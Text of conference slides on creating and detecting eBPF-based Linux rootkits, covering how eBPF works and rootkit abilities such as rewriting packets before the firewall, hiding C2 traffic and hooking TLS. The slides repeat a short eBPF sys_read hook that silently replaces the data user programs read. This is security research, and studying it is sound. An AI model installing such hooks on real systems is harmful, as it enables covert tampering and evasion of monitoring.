Warping Reality
Creating and countering 
the next generation of 
Linux rootkits using eBPF
Pat Hogan
@PathToFile
Overview
●
What are Linux kernel rootkits
●
Why writing and using rootkits is hard
●
How eBPF solves these problems and more
●
How to detect and prevent malicious eBPF usage
@pathtoﬁle
What are kernel rootkits?
Kernel Rootkits - Advantages
●
Attackers want to maintain access to 
compromised machines
○
Credentials change, vulnerabilities get 
patched, etc.
●
Hooking syscall table = visibility and control
○
See all network traﬃc
○
Hide ﬁles and processes
○
Create root processes
@pathtoﬁle
Kernel Rootkits - Risks
●
Small bugs can cause major problems
○
Crashing the kernel means crashing the 
system
●
Any update to the kernel risks disaster
●
Some environments block arbitrary kernel 
modules (e.g. Amazon EKS)
@pathtoﬁle
“How about we add 
JavaScript-like capabilities to the 
Linux Kernel?”
- Thomas Graf, Isovalent, 2020
What is eBPF?
eBPF
●
eBPF (extended Berkeley Packet Filtering)
●
Experienced rapid growth in last ~2 years
●
eBPF allows you to create programmable trace 
points in the kernel
●
Programs can be attached to:
○
Network Interfaces
○
Kernel functions
○
User mode functions
●
eBPF programs are guaranteed to be:
○
Safe
○
Eﬃcient
○
Portable
@pathtoﬁle
eBPF - Safe and Eﬃcient
●
Programs typically written in C or Rust
●
Has variables, loops, conditionals
●
Can call a small number of helper functions
●
Compiled by LLVM or GCC into bpf bytecode
●
Architecture agnostic
●
Kernel version agnostic
@pathtoﬁle
SEC("tp/syscalls/sys_enter_execve")
int handle_execve_enter(struct trace_event_raw_sys_enter *ctx)
{
    char prog[TASK_COMM_LEN];
    bpf_probe_read_user(&prog, sizeof(prog), ctx->args[0]);
    bpf_printk("Execve: %s", prog);
    return 0;
}
int handle_execve_enter(struct 
trace_event_raw_sys_enter * ctx):
; bpf_probe_read_user(&c, sizeof(c), ctx->args[0]);
   0: (79) r3 = *(u64 *)(r1 +16)
   1: (bf) r6 = r10
   2: (07) r6 += -16
; bpf_probe_read_user(&c, sizeof(c), ctx->args[0]);
   3: (bf) r1 = r6
   4: (b7) r2 = 16
   5: (85) call bpf_probe_read_user#-66336
   6: (b7) r1 = 29477
; bpf_printk("Execve: %s", c);
   7: (6b) *(u16 *)(r10 -24) = r1
   8: (18) r1 = 0x203a657663657845
  10: (7b) *(u64 *)(r10 -32) = r1
  11: (b7) r1 = 0
  12: (73) *(u8 *)(r10 -22) = r1
  13: (bf) r1 = r10
;
  14: (07) r1 += -32
; bpf_printk("Execve: %s", c);
  15: (b7) r2 = 11
  16: (bf) r3 = r6
  17: (85) call bpf_trace_printk#-61248
; return 0;
  18: (b7) r0 = 0
  19: (95) exit
eBPF - Safe and Eﬃcient
●
Sent to kernel via a user space loader
○
Only CAP_ADMIN or CAP_BPF*
●
Kernel eBPF Veriﬁer checks code isn’t:
○
Too big 
○
Too complex
○
Reading invalid memory
●
If code passes, it is compiled to native 
instructions using a JIT compiler
○
Patches locations of helper functions and ﬁelds
○
Enables portability across kernels
●
Program is then attached to network or function
○
Run once per packer/function call
○
Stateless, but can use Maps to store data
@pathtoﬁle
int main(int argc, char **argv) {
    struct example_bpf *skel;
    int err;
    /* Open BPF application */
    skel = example_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF skeleton\n");
        return 1;
    }
    /* Load & verify BPF programs */
    err = example_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to load and verify BPF skeleton\n");
        goto cleanup;
    }
    /* Attach tracepoint handler */
    err = example_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton\n");
        goto cleanup;
    }
    printf("Successfully started!\n");
    read_trace_pipe();
cleanup:
    example_bpf__destroy(skel);
    return -err;
}
Using eBPF to
Warp Network Reality
eBPF - Warping Network Reality
@pathtoﬁle
eBPF - Warping Network Reality
Security observes:
●
Connection from internal IP to ssh
●
No active internet-facing connections
eBPF enables:
●
Read and write packets pre-ﬁrewall
●
Routing packets across networks
●
Altering source and destination
IP and Ports
@pathtoﬁle
🔥🧱
eBPF - Warping Network Reality
Security observes:
●
Normal web connections
●
Nothing unusual in netstat or tcpdump
eBPF enables:
●
Reading C2 packets then discarding
●
Hijacking existing connections
●
Cloning packets to create new traﬃc
●
Can use UProbe to hook OpenSSL 
functions, read and write TLS
@pathtoﬁle
🔥🧱
Using eBPF to
Warp Data Reality
eBPF - Warping Data Reality
@pathtoﬁle
eBPF - Warping Data Reality
@pathtoﬁle
eBPF - Warping Data Reality
@pathtoﬁle
eBPF - Warping Data Reality
@pathtoﬁle
int main() {
    // Open File
    char filename[100] = "read_me";
    int fd = openat(AT_FDCWD, filename, O_RDWR);
    // Read data from file
    char buffer[100];
    read(fd, buffer, sizeof(buffer));
    printf("Data: %s\n", buffer);
    // Close file
    close(fd);
    return 0;
}
SEC("fexit/__x64_sys_read")
int BPF_PROG(read_exit, struct pt_regs *regs, long ret) {
    // 1. Read in data returned from kernel
    char buffer[100];
    bpf_probe_read_user(
&buffer, sizeof(buffer), PT_REGS_PARM2(regs)
    );
    // 2. Change data
    const char *fake_data = "fake_data";
    for (int i=0; i<sizeof(replace); i++) {
        buffer[i] = fake_data[i];
    }
    // 3. Overwrite
    bpf_probe_write_user(
PT_REGS_PARM2(regs), &buffer, sizeof(buffer)
    );
    return 0;
}
User space program
eBPF Program
eBPF - Warping Data Reality
@pathtoﬁle
int main() {
    // Open File
    char filename[100] = "read_me";
    int fd = openat(AT_FDCWD, filename, O_RDWR);
    // Read data from file
    char buffer[100];
    read(fd, buffer, sizeof(buffer));
    printf("Data: %s\n", buffer);
    // Close file
    close(fd);
    return 0;
}
SEC("fexit/__x64_sys_read")
int BPF_PROG(read_exit, struct pt_regs *regs, long ret) {
    // 1. Read in data returned from kernel
    char buffer[100];
    bpf_probe_read_user(
&buffer, sizeof(buffer), PT_REGS_PARM2(regs)
    );
    // 2. Change data
    const char *fake_data = "fake_data";
    for (int i=0; i<sizeof(replace); i++) {
        buffer[i] = fake_data[i];
    }
    // 3. Overwrite
    bpf_probe_write_user(
PT_REGS_PARM2(regs), &buffer, sizeof(buffer)
    );
    return 0;
}
User space program
eBPF Program
eBPF - Warping Data Reality
@pathtoﬁle
int main() {
    // Open File
    char filename[100] = "read_me";
    int fd = openat(AT_FDCWD, filename, O_RDWR);
    // Read data from file
    char buffer[100];
    read(fd, buffer, sizeof(buffer));
    printf("Data: %s\n", buffer);
    // Close file
    close(fd);
    return 0;
}
SEC("fexit/__x64_sys_read")
int BPF_PROG(read_exit, struct pt_regs *regs, long ret) {
    // 1. Read in data returned from kernel
    char buffer[100];
    bpf_probe_read_user(
&buffer, sizeof(buffer), PT_REGS_PARM2(regs)
    );
    // 2. Change data
    const char *fake_data = "fake_data";
    for (int i=0; i<sizeof(replace); i++) {
        buffer[i] = fake_data[i];
    }
    // 3. Overwrite
    bpf_probe_write_user(
PT_REGS_PARM2(regs), &buffer, sizeof(buffer)
    );
    return 0;
}
User space program
eBPF Program